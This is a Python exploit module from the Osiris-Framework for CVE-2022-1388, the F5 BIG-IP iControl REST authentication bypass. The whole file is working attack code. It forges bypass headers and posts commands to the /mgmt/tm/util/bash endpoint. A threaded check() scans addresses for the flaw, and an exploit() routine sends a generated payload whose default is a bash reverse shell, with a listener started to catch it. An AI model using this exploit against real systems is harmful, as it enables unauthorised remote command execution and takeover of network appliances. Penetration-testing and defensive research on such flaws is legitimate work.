#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import json
import threading

import requests
from core.ModuleObtainer import obtainer
import urllib3
from core.Processor import processor
from core.generator.Generator import generator
from time import sleep
from utilities.Tools import tools
from utilities.Messages import print_message

print_message.name_module = __file__

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


info = {
    'author': 'Samir Sanchez Garnica',
    'date': '24/01/2023',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/linux/http/f5_icontrol_rce.py',
    'license': 'GPL-2.0',
    'description': 'F5 BIG-IP iControl RCE via REST Authentication Bypass',
    'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-1388','https://support.f5.com/csp/article/K23605346','https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/','https://github.com/alt3kx/CVE-2022-1388_PoC']
}


options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'payload': ['Yes', 'Set payload attack software', 'cmd/unix/reverse/bash_i'],
}

extra_info = {
    'cve': ['CVE-2022-1388'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'True'
}



def headers():
    __headers = {
        "Host": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'a',
        'Authorization': 'Basic YWRtaW46'
    }
    return __headers

def is_vulnerable(target):
    __check_url = "https://" + target + "/mgmt/tm/util/bash"
    __payload = {'command': 'run', 'utilCmdArgs': '-c id'}

    try:
        __response = requests.post(url=__check_url, json=__payload, headers=headers(), verify=False, timeout=5)
        if __response.status_code == 200 and 'commandResult' in __response.text:
            print_message.execution_info("The Target {} is vulnerable".format(__check_url.split("/mgmt")[0]))

    except Exception as Error:
        pass

def RCE(target, payload):
    __check_url = "https://" + target + "/mgmt/tm/util/bash"
    __payload = {'command': 'run', 'utilCmdArgs': "-c '{0}'".format(payload)}

    try:
        __response = requests.post(url=__check_url, json=__payload, headers=headers(), verify=False, timeout=5)
        if __response.status_code == 200 and 'commandResult' in __response.text:
            __default = json.loads(__response.text)
            __display = __default['commandResult']
            print_message.execution_info("The Target {} is vulnerable successful payload execution".format(__check_url.split("/mgmt")[0]))
            print_message.execution_info("Response: {0}".format(__display))
    except Exception as Error:
        pass


def check():
    __target = obtainer.options['target'][2]
    __threads = []

    __response = tools.check_IPV4(__target)
    if __response['code'] != 200:
        print_message.execution_error(__response['message'])
        return False

    print_message.start_execution()
    for __address in __response['message']:
        __thread = threading.Thread(target=is_vulnerable, args=(__address,))
        __thread.start()
        __threads.append(__thread)
        sleep(0.1)

    for __join_thread in __threads:
        __join_thread.join()

    print_message.end_execution()

def exploit():
    __target = obtainer.options['target'][2]
    __threads = []

    __response = tools.check_IPV4(__target)
    if __response['code'] != 200:
        print_message.execution_error(__response['message'])
        return False

    print_message.start_execution()
    processor.multi_handler(payload_options=obtainer.options_payload,
                            exploit_options=obtainer.options)

    for __address in __response['message']:
        __payload_generate = generator.generator_payload(options_payload=obtainer.options_payload,
                                                         options_exploit=obtainer.options,
                                                         extra_info=extra_info)
        __thread = threading.Thread(target=RCE, args=(__address, __payload_generate['message']))
        __thread.start()
        __threads.append(__thread)
        sleep(0.1)

    for __join_thread in __threads:
        __join_thread.join()

    print_message.end_execution()
